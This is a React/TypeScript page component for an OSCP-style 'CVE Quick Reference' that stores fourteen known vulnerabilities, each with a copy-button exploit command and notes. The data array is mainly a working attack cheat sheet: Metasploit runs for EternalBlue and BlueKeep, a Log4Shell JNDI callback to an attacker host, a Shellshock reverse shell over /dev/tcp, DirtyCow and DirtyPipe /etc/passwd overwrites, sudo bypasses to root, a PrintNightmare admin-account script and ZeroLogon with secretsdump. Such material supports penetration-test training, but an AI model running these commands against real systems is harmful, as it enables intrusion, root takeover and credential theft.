"use client";

import { Check, Copy, ExternalLink } from "lucide-react";
import { useMemo, useState } from "react";
import toast from "react-hot-toast";

type Severity = "Critical" | "High" | "Medium";

type CVE = {
  id: string;
  name: string;
  affected: string;
  vector: string;
  exploitCmd: string;
  notes: string;
  severity: Severity;
  tags: string[];
};

const CVES: CVE[] = [
  {
    id: "MS17-010",
    name: "EternalBlue",
    affected: "Windows 7 / Server 2008 R2 (unpatched)",
    vector: "SMB port 445 — unauthenticated RCE via SMBv1 buffer overflow",
    exploitCmd: "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {RHOST}; run",
    notes: "Check with: nmap -p 445 --script smb-vuln-ms17-010 {RHOST}. Extremely common on OSCP. Gives SYSTEM directly.",
    severity: "Critical",
    tags: ["windows"],
  },
  {
    id: "CVE-2019-0708",
    name: "BlueKeep",
    affected: "Windows 7 / Server 2008 (RDP enabled, unpatched)",
    vector: "RDP port 3389 — pre-auth unauthenticated RCE via use-after-free",
    exploitCmd: "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {RHOST}; run",
    notes: "Less reliable than EternalBlue. Check first: nmap -p 3389 --script rdp-vuln-ms12-020. May BSOD target.",
    severity: "Critical",
    tags: ["windows"],
  },
  {
    id: "CVE-2021-34527",
    name: "PrintNightmare",
    affected: "Windows (all — Print Spooler service running)",
    vector: "Print Spooler service — authenticated RCE or LPE via DLL loading",
    exploitCmd: "impacket-rpcdump @{RHOST} | grep MS-RPRN  # confirm vulnerable",
    notes: "Two variants: remote RCE (needs creds) and local LPE. Use CVE-2021-1675 PoC for LPE. Very common in AD labs.",
    severity: "Critical",
    tags: ["windows", "ad"],
  },
  {
    id: "CVE-2020-1472",
    name: "ZeroLogon",
    affected: "Windows Server 2016/2019 DC (Netlogon unpatched)",
    vector: "Netlogon — set DC machine account password to empty without auth",
    exploitCmd: "python3 zerologon_tester.py DC_HOSTNAME DC_IP",
    notes: "Resets DC machine account password — may break the domain. Use secretsdump after: domain/DC$@DC_IP -no-pass -just-dc",
    severity: "Critical",
    tags: ["windows", "ad"],
  },
  {
    id: "CVE-2021-44228",
    name: "Log4Shell",
    affected: "Apache Log4j 2.0-beta9 to 2.14.1",
    vector: "HTTP request headers (User-Agent, X-Forwarded-For) — JNDI LDAP lookup causing RCE",
    exploitCmd: "curl -H 'X-Api-Version: ${jndi:ldap://{LHOST}:1389/exploit}' http://{RHOST}/",
    notes: "Use ysoserial-ng or marshalsec for JNDI server. Check Burp collab/interactsh first to confirm OOB callback.",
    severity: "Critical",
    tags: ["web", "linux"],
  },
  {
    id: "CVE-2022-0847",
    name: "DirtyPipe",
    affected: "Linux kernel 5.8 – 5.16.10 / 5.15.25 / 5.10.102",
    vector: "Local — overwrite read-only files via pipe splice; write to /etc/passwd or SUID binary",
    exploitCmd: "gcc dirtypipe.c -o dp && ./dp /etc/passwd",
    notes: "Instant root if kernel is in range. Check: uname -r. Also exploitable via: overwrite /usr/bin/sudo with shell.",
    severity: "Critical",
    tags: ["linux"],
  },
  {
    id: "CVE-2021-4034",
    name: "PwnKit",
    affected: "polkit pkexec (most Linux distros before Jan 2022 patches)",
    vector: "Local — heap corruption in pkexec → arbitrary code execution as root",
    exploitCmd: "gcc pwnkit.c -o pwnkit && ./pwnkit",
    notes: "Works on Ubuntu, Debian, Fedora, CentOS. Check: dpkg -l policykit-1 | grep ii. Very reliable LPE.",
    severity: "High",
    tags: ["linux"],
  },
  {
    id: "CVE-2021-3156",
    name: "Baron Samedit",
    affected: "sudo < 1.9.5p2 (heap-based buffer overflow)",
    vector: "Local — sudoedit -s with trailing backslash triggers heap overflow → root",
    exploitCmd: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
    notes: "Check sudo version: sudo --version. Affects legacy systems. PoC available on GitHub (blasty/CVE-2021-3156).",
    severity: "High",
    tags: ["linux"],
  },
  {
    id: "CVE-2014-6271",
    name: "Shellshock",
    affected: "bash < 4.3 patch 25 (CGI scripts, DHCP hooks, SSH ForceCommand)",
    vector: "HTTP CGI env vars — function definition exploit triggers arbitrary command execution",
    exploitCmd: "curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' http://{RHOST}/cgi-bin/test.cgi",
    notes: "Look for /cgi-bin/ endpoints. Also works via: SSH -o SendEnv='() { :; }; cmd'. Gives www-data shell typically.",
    severity: "Critical",
    tags: ["linux", "web"],
  },
  {
    id: "CVE-2018-10933",
    name: "LibSSH Auth Bypass",
    affected: "libssh 0.6 – 0.7.5 / 0.8.0-0.8.3 (server-mode only)",
    vector: "Send SSH2_MSG_USERAUTH_SUCCESS before authentication — bypasses auth entirely",
    exploitCmd: "python3 libssh_bypass.py {RHOST} 22",
    notes: "Check with: ssh -V (server banner). Only affects libssh server implementations, not OpenSSH.",
    severity: "Critical",
    tags: ["linux"],
  },
  {
    id: "CVE-2019-14287",
    name: "Sudo -1 UID Bypass",
    affected: "sudo < 1.8.28",
    vector: "sudo -u#-1 command — bypasses Runas user restrictions when ALL is in sudoers",
    exploitCmd: "sudo -u#-1 /bin/bash",
    notes: "Requires: user ALL=(ALL) NOPASSWD: /bin/bash in sudoers (or similar). The -1 uid maps to root (uid 0).",
    severity: "High",
    tags: ["linux"],
  },
  {
    id: "CVE-2016-5195",
    name: "DirtyCow",
    affected: "Linux kernel < 4.8.3 (all distributions before Oct 2016)",
    vector: "Local — race condition in copy-on-write (mmap) → write to read-only files as unprivileged user",
    exploitCmd: "gcc -pthread dirtycow.c -o dirtycow -lcrypt && ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'",
    notes: "Old but still seen on legacy OSCP machines. Very reliable but may crash the system. Use carefully.",
    severity: "High",
    tags: ["linux"],
  },
  {
    id: "CVE-2021-1675",
    name: "PrintNightmare LPE",
    affected: "Windows (Print Spooler running, local user)",
    vector: "Local privilege escalation via DLL loading in Print Spooler without network access",
    exploitCmd: "Import-Module .\\CVE-2021-1675.ps1; Invoke-Nightmare -DriverName 'Vuln' -NewUser 'hax' -NewPassword 'P@ss123'",
    notes: "Local variant — no network needed. Creates a new local admin. Pairs well with PrintNightmare RCE (CVE-2021-34527).",
    severity: "High",
    tags: ["windows"],
  },
  {
    id: "CVE-2017-0144",
    name: "EternalRomance / SMB RCE",
    affected: "Windows XP / 2003 / Vista / 7 / 2008 (SMBv1)",
    vector: "SMB port 445 — older EternalBlue variant targeting Windows XP/2003 systems",
    exploitCmd: "use exploit/windows/smb/ms17_010_psexec; set RHOSTS {RHOST}; run",
    notes: "Use ms17_010_psexec for XP/2003 targets where eternalblue module fails. More compatible with older systems.",
    severity: "Critical",
    tags: ["windows"],
  },
];

const severityColors: Record<Severity, string> = {
  Critical: "border-red/50 bg-red/10 text-red",
  High: "border-orange/50 bg-orange/10 text-orange",
  Medium: "border-warn/50 bg-warn/10 text-warn",
};

const tagColors: Record<string, string> = {
  linux: "bg-success/15 text-success border-success/40",
  windows: "bg-core/15 text-core border-core/40",
  ad: "bg-adblue/15 text-adblue border-adblue/40",
  web: "bg-post/15 text-post border-post/40",
};

function CopyBtn({ value }: { value: string }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    await navigator.clipboard.writeText(value);
    setCopied(true);
    toast.success("Copied!");
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button onClick={copy} className="shrink-0 text-dim hover:text-orange transition-colors">
      {copied ? <Check size={12} className="text-success" /> : <Copy size={12} />}
    </button>
  );
}

export default function CvePage() {
  const [query, setQuery] = useState("");
  const [tagFilter, setTagFilter] = useState("all");
  const [sevFilter, setSevFilter] = useState("all");

  const tags = ["all", "linux", "windows", "ad", "web"];
  const sevs = ["all", "Critical", "High", "Medium"];

  const visible = useMemo(() => {
    const q = query.trim().toLowerCase();
    return CVES.filter((c) => {
      const tagOk = tagFilter === "all" || c.tags.includes(tagFilter);
      const sevOk = sevFilter === "all" || c.severity === sevFilter;
      const textOk = !q || `${c.id} ${c.name} ${c.affected} ${c.vector}`.toLowerCase().includes(q);
      return tagOk && sevOk && textOk;
    });
  }, [query, tagFilter, sevFilter]);

  return (
    <div className="space-y-5">
      <header>
        <h1 className="font-heading text-3xl text-bright">CVE Quick Reference</h1>
        <p className="mt-1 text-sm text-dim">Common OSCP CVEs with exploit commands and context. Click copy to grab the command.</p>
      </header>

      {/* Controls */}
      <div className="space-y-2">
        <input
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          placeholder="Search CVE ID, name, affected system..."
          className="w-full rounded border border-border bg-surface px-3 py-2 font-mono text-sm text-bright placeholder:text-dim outline-none focus:border-orange/50"
          spellCheck={false}
          autoComplete="off"
        />
        <div className="flex flex-wrap gap-2">
          <div className="flex gap-1.5">
            {tags.map((t) => (
              <button
                key={t}
                onClick={() => setTagFilter(t)}
                className={`rounded border px-2.5 py-1 font-mono text-[10px] uppercase transition-colors ${tagFilter === t ? "border-orange/60 bg-orange/10 text-orange" : "border-border bg-surface2 text-dim hover:text-bright"}`}
              >
                {t}
              </button>
            ))}
          </div>
          <div className="flex gap-1.5">
            {sevs.map((s) => (
              <button
                key={s}
                onClick={() => setSevFilter(s)}
                className={`rounded border px-2.5 py-1 font-mono text-[10px] uppercase transition-colors ${sevFilter === s ? "border-orange/60 bg-orange/10 text-orange" : "border-border bg-surface2 text-dim hover:text-bright"}`}
              >
                {s}
              </button>
            ))}
          </div>
          <span className="ml-auto self-center font-mono text-[10px] text-dim">{visible.length} entries</span>
        </div>
      </div>

      {/* CVE list */}
      <div className="space-y-3">
        {visible.map((cve) => (
          <article key={cve.id} className="rounded border border-border bg-surface overflow-hidden">
            <div className="p-4">
              {/* Header row */}
              <div className="flex flex-wrap items-start justify-between gap-2 mb-3">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="font-mono text-sm font-bold text-bright">{cve.id}</span>
                  <span className="font-mono text-sm text-orange">/ {cve.name}</span>
                  <span className={`rounded border px-1.5 py-0.5 font-mono text-[10px] ${severityColors[cve.severity]}`}>
                    {cve.severity}
                  </span>
                  {cve.tags.map((t) => (
                    <span key={t} className={`rounded border px-1.5 py-0.5 font-mono text-[10px] uppercase ${tagColors[t] ?? "bg-dim/10 text-dim border-border"}`}>{t}</span>
                  ))}
                </div>
              </div>

              {/* Affected */}
              <div className="mb-2">
                <span className="font-mono text-[10px] text-dim/60 uppercase mr-2">Affected</span>
                <span className="font-mono text-xs text-bright">{cve.affected}</span>
              </div>

              {/* Vector */}
              <div className="mb-3">
                <span className="font-mono text-[10px] text-dim/60 uppercase mr-2">Vector</span>
                <span className="text-xs text-dim">{cve.vector}</span>
              </div>

              {/* Exploit command */}
              <div className="rounded border border-border bg-surface2 px-3 py-2">
                <div className="flex items-center justify-between gap-2 mb-1">
                  <span className="font-mono text-[10px] text-dim/60 uppercase">Exploit</span>
                  <CopyBtn value={cve.exploitCmd} />
                </div>
                <code className="font-mono text-xs text-success break-all">{cve.exploitCmd}</code>
              </div>

              {/* Notes */}
              <p className="mt-2.5 text-xs text-dim leading-relaxed">
                <span className="text-orange/70">note: </span>{cve.notes}
              </p>
            </div>
          </article>
        ))}

        {visible.length === 0 && (
          <p className="text-sm text-dim">No CVEs match your filter.</p>
        )}
      </div>
    </div>
  );
}
